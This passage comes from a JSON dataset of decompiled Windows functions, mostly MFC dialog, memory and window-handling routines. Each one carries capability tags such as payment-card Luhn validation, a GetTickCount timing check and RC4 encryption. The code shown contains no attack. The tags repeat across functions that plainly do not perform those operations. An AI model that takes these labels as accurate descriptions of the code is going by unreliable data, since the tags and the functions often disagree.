        "decompiled_code": "\nuint32_t __cdecl\nfcn.004115cb(int32_t arg_8h, uint *arg_ch, uint noname_2, code *arg_14h, uint *arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint uVar3;\n    uint *unaff_ESI;\n    uint *puVar4;\n    \n    uVar3 = unaff_EBX;\n    puVar4 = unaff_ESI;\n    if (arg_8h != 0) goto code_r0x004115da;\ncode_r0x004115d5:\n    fcn.00411e42();\n    arg_8h = extraout_ECX;\n    uVar3 = unaff_EBX;\n    puVar4 = unaff_ESI;\ncode_r0x004115da:\n    unaff_EBX = 1;\n    if (arg_20h != NULL) {\n        *arg_20h = arg_8h;\n        arg_20h[1] = arg_14h;\n        return 1;\n    }\n    if (0xb < arg_1ch - 0x38U) {\n        return 0;\n    }\n    // switch table (12 cases) at 0x4116d3\n    unaff_ESI = puVar4;\n    switch(*((arg_1ch - 0x38U) * 4 + 0x4116d3)) {\n    case 0x41160b:\n        (*arg_14h)();\n        return 1;\n    case 0x411613:\n        uVar2 = (*arg_14h)();\n        return uVar2;\n    case 0x41161b:\n        arg_18h = arg_ch;\n        break;\n    case 0x411626:\n        arg_18h = arg_ch;\n        goto code_r0x004116bf;\n    case 0x41162e:\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_18h[1], *arg_18h);\n            return 1;\n        }\n        goto code_r0x004115d5;\n    case 0x411642:\n        if (arg_18h != NULL) {\n            uVar2 = (*arg_14h)(arg_18h[1], *arg_18h);\n            return uVar2;\n        }\n        goto code_r0x004115d5;\n    case 0x411653:\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n            return 1;\n        }\n        goto code_r0x004115d5;\n    case 0x41166b:\n        if (arg_18h != NULL) {\n            uVar2 = (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n            return uVar2;\n        }\n        goto code_r0x004115d5;\n    case 0x411683:\n        unaff_ESI = arg_18h;\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_18h);\n            goto code_r0x00411692;\n        }\n        goto code_r0x004115d5;\n    case 0x4116a0:\n        goto code_r0x004116a0;\n    case 0x4116b4:\n        break;\n    case 0x4116bc:\ncode_r0x004116bf:\n        uVar2 = (*arg_14h)(arg_18h);\n        return uVar2;\n    }\n    (*arg_14h)(arg_18h);\n    return 1;\ncode_r0x004116a0:\n    unaff_ESI = arg_18h;\n    if (arg_18h != NULL) {\n        (*arg_14h)(arg_18h, arg_ch, puVar4, uVar3);\ncode_r0x00411692:\n        iVar1 = arg_18h[7];\n        arg_18h[7] = 0;\n        return iVar1 == 0;\n    }\n    goto code_r0x004115d5;\n}\n",
        "token_count": 952
    },
    "00411e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411e90(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004628b9(param_1, param_2, param_3, param_4);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 80
    },
    "004120e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.004120e0(code **param_1)\n\n{\n    fcn.00416e9b();\n    *param_1 = vtable.CDialog.0;\n    fcn.00462290(param_1 + 0x15, 0, 0x20);\n    return param_1;\n}\n",
        "token_count": 73
    },
    "004121cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.004121cd(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.00416e9b();\n    *param_1 = vtable.CDialog.0;\n    fcn.00462290(param_1 + 0x15, 0, 0x20);\n    param_1[0x1a] = param_3;\n    param_1[0x15] = param_2;\n    param_1[0x16] = param_2 & 0xffff;\n    return param_1;\n}\n",
        "token_count": 132
    },
    "00412738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: hMem\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412738(uint arg_8h, uint arg_ch, uint hInstance)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    bool bVar5;\n    uint var_48h;\n    uint var_38h;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint hMem;\n    uint var_4h;\n    \n    fcn.004627e2(0x3c);\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar2 = fcn.0043026e();\n        *(unaff_EBP + 0x10) = *(iVar2 + 0xc);\n    }\n    iVar2 = fcn.0043026e();\n    piVar1 = *(iVar2 + 0x3c);\n    *(unaff_EBP + -0x28) = piVar1;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0041b8ed(0x10);\n    fcn.0041b8ed(0x7c000);\n    if (piVar1 == NULL) {\n        iVar2 = *(unaff_EBP + 8);\n    }\n    else {\n        iVar2 = (**(*extraout_ECX + 300))(unaff_EBP + -0x48);\n        if (iVar2 == 0) goto code_r0x00412920;\n        iVar2 = (**(*piVar1 + 0x14))(unaff_EBP + -0x48, *(unaff_EBP + 8));\n    }\n    if (iVar2 == 0) goto code_r0x00412920;\n    uVar3 = fcn.0042407a();\n    fcn.0040f840(uVar3);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x18) = 0;\n    iVar4 = fcn.0043162a(iVar2, unaff_EBP + -0x1c, unaff_EBP + -0x18);\n    bVar5 = iVar4 == 0;\n    if (*0x4bb62c == 0) {\ncode_r0x0041281e:\n        if (bVar5) {\ncode_r0x00412822:\n            fcn.004315aa(iVar2);\n            *(unaff_EBP + -4) = 2;\n            fcn.00431508(*(unaff_EBP + -0x18));\n            uVar3 = fcn.00431032();\n            *(unaff_EBP + -0x14) = uVar3;\n            *(unaff_EBP + -4) = 1;\n            fcn.00431024();\n            if (*(unaff_EBP + -0x14) != 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n            }\n        }\n    }\n    else {\n        if (bVar5) goto code_r0x00412822;\n        iVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n        if (iVar4 != 0) {\n            iVar4 = fcn.004126f7(iVar2, \"MS Shell Dlg\");\n            bVar5 = iVar4 == 0;\n            if (bVar5) {\n                if (*(unaff_EBP + -0x18) == 8) {\n                    *(unaff_EBP + -0x18) = 0;\n                }\n                goto code_r0x0041281e;\n            }\n        }\n    }\n    extraout_ECX[0x11] = -1;\n    extraout_ECX[0xf] = extraout_ECX[0xf] | 0x10;\n    fcn.0041a8cb(extraout_ECX);\n    if (*(unaff_EBP + 0xc) == 0) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(unaff_EBP + 0xc) + 0x20);\n    }\n    iVar2 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)(*(unaff_EBP + 0x10), iVar2, uVar3, fcn.004120a6, 0);\n    fcn.00402740();\n    *(unaff_EBP + -4) = 0xffffffff;\n    if ((*(unaff_EBP + -0x28) != NULL) && ((**(**(unaff_EBP + -0x28) + 0x18))(unaff_EBP + -0x48),  iVar2 != 0)) {\n        (**(*extraout_ECX + 300))(0);\n    }\n    iVar4 = fcn.0041866d();\n    if (iVar4 == 0) {\n        (**(*extraout_ECX + 0x114))();\n    }\n    if ((iVar2 != 0) && ((*(extraout_ECX + 0xf) & 0x10) == 0)) {\n        (*_sym.imp.USER32.dll_DestroyWindow)(iVar2);\n    }\n    if (*(unaff_EBP + -0x14) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n    }\ncode_r0x00412920:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 1387
    },
    "00412c11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00412c11(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042f538(0x492f00);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0042f538(0x492be0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0042f538(0x492bfc);\n            iVar1 = (-(iVar1 != 0) & 0xffff4002) + 0x8000ffff;\n        }\n        else {\n            iVar1 = -0x7ff8fff2;\n        }\n    }\n    else {\n        iVar1 = *(param_1 + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 173
    },
    "004130f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004130f7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint cb;\n    \n    cb = 0;\n    iVar1 = fcn.004130d7(&cb, arg_8h, arg_ch);\n    if (iVar1 < 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(cb);\n    return uVar2;\n}\n",
        "token_count": 113
    },
    "0041314e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041314e(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045f3a0(param_1, param_2, param_3, param_4);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 82
    },
    "0041316d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041316d(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0041312f(param_1, param_2, param_3, param_4);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 80
    },
    "004132f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004132f5(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalSize;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GlobalSize)(arg_ch);\n    if (arg_8h == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2002, uVar3);\n        if (arg_8h != 0) {\ncode_r0x0041332e:\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalLock;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)(arg_ch);\n            uVar6 = (*pcVar2)(arg_8h);\n            uVar5 = (*pcVar1)(arg_8h, uVar5, uVar3);\n            fcn.0041314e(uVar6, uVar5);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(arg_8h);\n            (*pcVar1)(arg_ch);\n            return arg_8h;\n        }\n    }\n    else {\n        uVar4 = (*pcVar1)(arg_8h);\n        if (uVar3 <= uVar4) goto code_r0x0041332e;\n    }\n    return 0;\n}\n",
        "token_count": 356
    },
    "004136d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004136d8(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    if (param_2 == NULL) {\n        fcn.00401280(0x80004005);\n        param_2 = extraout_ECX;\n    }\n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 122
    },
    "0041372f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041372f(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    \n    uVar1 = *param_1;\n    uVar4 = uVar1;\n    piVar2 = *(uVar1 - 0x10);\n    if (*(uVar1 - 0xc) != 0) {\n        if (*(uVar1 - 4) < 0) {\n            if (*(uVar1 - 8) < 0) {\n                uVar4 = fcn.00401280(0x80070057);\n            }\n            *(uVar4 + -0xc) = uVar4 >> 0x20;\n            **param_1 = uVar4 >> 0x20;\n        }\n        else {\n            fcn.00402740();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *param_1 = iVar3 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00413786": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413786(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    \n    uVar1 = *param_1;\n    uVar4 = uVar1;\n    piVar2 = *(uVar1 - 0x10);\n    if (*(uVar1 - 0xc) != 0) {\n        if (*(uVar1 - 4) < 0) {\n            if (*(uVar1 - 8) < 0) {\n                uVar4 = fcn.00401280(0x80070057);\n            }\n            *(uVar4 + -0xc) = uVar4 >> 0x20;\n            **param_1 = uVar4 >> 0x20;\n        }\n        else {\n            fcn.00402740();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *param_1 = iVar3 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "004137cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004137cf(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    puVar3 = (**(**(iVar1 + -0x10) + 0x10))();\n    iVar4 = (***puVar3)(arg_8h, 2);\n    if (iVar4 == 0) {\n        fcn.00413724();\n    }\n    if (iVar2 < arg_8h) {\n        arg_8h = iVar2;\n    }\n    fcn.004130b8(iVar4 + 0x10, arg_8h + 1, iVar1, arg_8h + 1);\n    *(iVar4 + 4) = iVar2;\n    fcn.00402740();\n    *in_ECX = iVar4 + 0x10;\n    return;\n}\n",
        "token_count": 250
    },
    "00413837": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00413837(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    ppiVar1 = *param_1 + -0x10;\n    if ((*(*param_1 + -8) < param_2) && (0 < param_2)) {\n        iVar2 = (**(**ppiVar1 + 8))(ppiVar1, param_2, 2);\n        if (iVar2 != 0) goto code_r0x00413862;\n    }\n    iVar2 = fcn.00413724();\ncode_r0x00413862:\n    *param_1 = iVar2 + 0x10;\n    return;\n}\n",
        "token_count": 166
    },
    "0041396f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041396f(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00413237(param_2);\n    }\n    if (iVar1 < 1) {\n        fcn.0041372f();\n    }\n    else {\n        uVar2 = fcn.0040f8a0(iVar1);\n        fcn.0040fde0(uVar2, iVar1, param_2, 0xffffffff);\n        fcn.0040f8d0(iVar1);\n    }\n    return param_1;\n}\n",
        "token_count": 167
    },
    "004139b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004139b9(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = *(*in_ECX + -0xc);\n    uVar3 = arg_8h - *in_ECX;\n    iVar2 = fcn.0040f8a0(arg_ch + uVar1);\n    if (uVar3 <= uVar1) {\n        arg_8h = uVar3 + iVar2;\n    }\n    fcn.0045f3a0(iVar2 + uVar1, arg_ch, arg_8h, arg_ch);\n    fcn.0040f8d0(arg_ch + uVar1);\n    return;\n}\n",
        "token_count": 192
    },
    "00413d72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: lpInitData\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00413d72(uint arg_8h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uchar *arg_8h_00;\n    uint uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    int32_t arg_8h_01;\n    int32_t unaff_EBP;\n    int32_t arg_ch;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint lpInitData;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00462818();\n    arg_8h_00 = &stack0xfffffffc;\n    (**0x4b94e8)();\n    *(unaff_EBP + -0x14) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (iVar3 == 0) {\n        (*_sym.imp.GDI32.dll_CreateDCA)(\"DISPLAY\", 0, 0, 0);\n        goto code_r0x00413da3;\n    }\n    if (*(iVar3 + 10) == 0) {\n        arg_ch = 0;\n    }\n    else {\n        arg_ch = *(iVar3 + 10) + iVar3;\n    }\n    uVar1 = *(iVar3 + 4);\n    uVar2 = *(iVar3 + 6);\n    arg_8h_01 = *(iVar3 + 8) + iVar3;\n    *(unaff_EBP + -0x1c) = arg_8h_01;\n    if (arg_ch == 0) {\n        *(unaff_EBP + -0x18) = 0;\n    }\n    else {\n        uVar5 = *(arg_ch + 0x46) + 0x9c;\n        if (uVar5 < 0x401) {\n            cVar4 = fcn.00401120(uVar5);\n            if (cVar4 == '\\0') goto code_r0x00413e15;\n            fcn.00462d70();\n        }\n        else {\ncode_r0x00413e15:\n            arg_8h_00 = fcn.00402070(*(arg_ch + 0x46) + 0x9c);\n        }\n        uVar6 = fcn.004135bd(arg_8h_00, arg_ch);\n        arg_8h_01 = *(unaff_EBP + -0x1c);\n        *(unaff_EBP + -0x18) = uVar6;\n    }\n    puVar7 = fcn.00413a89(arg_8h_01);\n    *(unaff_EBP + -4) = 1;\n    puVar8 = fcn.00413a89(uVar2 + iVar3);\n    *(unaff_EBP + -4) = 2;\n    puVar9 = fcn.00413a89(uVar1 + iVar3);\n    (*_sym.imp.GDI32.dll_CreateDCA)(*puVar9, *puVar8, *puVar7, *(unaff_EBP + -0x18));\n    fcn.00402740();\n    fcn.00402740();\n    fcn.00402740();\ncode_r0x00413da3:\n    fcn.004020b0();\n    *(unaff_EBP + -0x3c) = 0x413db5;\n    fcn.0046289b();\n    return;\n}\n",
        "token_count": 893
    },
    "00413ea7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00413ea7(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00413195(param_2);\n    }\n    if (iVar1 < 1) {\n        fcn.00413786();\n    }\n    else {\n        uVar2 = fcn.00413945(iVar1);\n        fcn.004131b9(uVar2, iVar1, param_2, 0xffffffff);\n        fcn.004136fd(iVar1);\n    }\n    return param_1;\n}\n",
        "token_count": 159
    },
    "00413ef1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint16_t * fcn.00413ef1(uint param_1, uint param_2)\n\n{\n    uint16_t *puVar1;\n    uint arg_8h;\n    uint32_t arg_ch;\n    \n    puVar1 = fcn.004026e0(param_1, param_2);\n    if (puVar1 != NULL) {\n        arg_ch = *puVar1;\n        arg_8h = fcn.00413945(arg_ch);\n        fcn.004131d9(arg_8h, arg_ch, puVar1 + 1, *puVar1);\n        fcn.004136fd(arg_ch);\n        puVar1 = 0x1;\n    }\n    return puVar1;\n}\n",
        "token_count": 158
    },
    "00414e09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00414e09(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_50h;\n    uint var_4h;\n    \n    fcn.00462818(0x8c);\n    uVar5 = *(unaff_EBP + 0x1c);\n    iVar1 = **(unaff_EBP + 8);\n    *(unaff_EBP + -0x98) = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        puVar3 = fcn.00462f86();\n        uVar2 = *puVar3;\n        puVar3 = fcn.00462f86();\n        *puVar3 = 0;\n        fcn.00463535(unaff_EBP + -0x90, 0x40, 0x3f, uVar5, *(unaff_EBP + 0xc));\n        piVar4 = fcn.00462f86();\n        if (*piVar4 == 0) {\n            puVar3 = fcn.00462f86();\n            *puVar3 = uVar2;\n        }\n        else {\n            puVar3 = fcn.00462f86();\n            fcn.0041367c(*puVar3);\n        }\n        puVar3 = fcn.00462f86();\n        uVar2 = *puVar3;\n        puVar3 = fcn.00462f86();\n        *puVar3 = 0;\n        fcn.00463535(unaff_EBP + -0x50, 0x40, 0x3f, uVar5, *(unaff_EBP + 0x14));\n        piVar4 = fcn.00462f86();\n        if (*piVar4 == 0) {\n            puVar3 = fcn.00462f86();\n            *puVar3 = uVar2;\n        }\n        else {\n            puVar3 = fcn.00462f86();\n            fcn.0041367c(*puVar3);\n        }\n        uVar5 = fcn.0042407a();\n        fcn.0040f840(uVar5);\n        *(unaff_EBP + -4) = 0;\n        fcn.00431fe0(unaff_EBP + -0x94, *(unaff_EBP + 0x20), unaff_EBP + -0x90, unaff_EBP + -0x50);\n        fcn.00426240(*(unaff_EBP + -0x94), 0x30, *(unaff_EBP + 0x20));\n        fcn.0041372f();\n        fcn.0041470f();\n        fcn.00402740();\n    }\n    fcn.0046289b();\n    return;\n}\n",
        "token_count": 722
    },
    "0041577e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041577e(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.00415534();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                fcn.004635fb(arg_ch + 10, 0x20, \"DISPLAY\", 0x1f);\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x4bb060)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 418
    },
    "00416670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00416670(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *extraout_ECX;\n    \n    piVar1 = *param_1;\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00411e42();\n        param_1 = extraout_ECX;\n    }\n    *param_1 = *piVar1;\n    return piVar1 + 2;\n}\n",
        "token_count": 106
    },
    "00417ece": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00417ece(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0x24);\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x28) = extraout_ECX;\n    *(unaff_EBP + -0x24) = 0;\n    iVar1 = fcn.0042fcbb();\n    *(unaff_EBP + -0x18) = iVar1;\n    *(unaff_EBP + -0x14) = *(iVar1 + 0xdc);\n    *(iVar1 + 0xdc) = extraout_ECX[8];\n    iVar1 = *extraout_ECX;\n    *(unaff_EBP + 8) = 0;\n    *(unaff_EBP + -4) = 0;\n    (**(iVar1 + 0xf4))(unaff_EBP + -0x2c);\n    *(unaff_EBP + 8) = 1;\n    *(*(unaff_EBP + -0x18) + 0xdc) = *(unaff_EBP + -0x14);\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 354
    },
    "00417f59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417f59(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t lpPoints;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0041be35();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x20), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x20));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x20);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x20), &var_38h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.004122c3();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x20);\n            }\n            uVar3 = fcn.00415713(iVar5, 1);\n            fcn.0041577e(uVar3, iVar5);\n            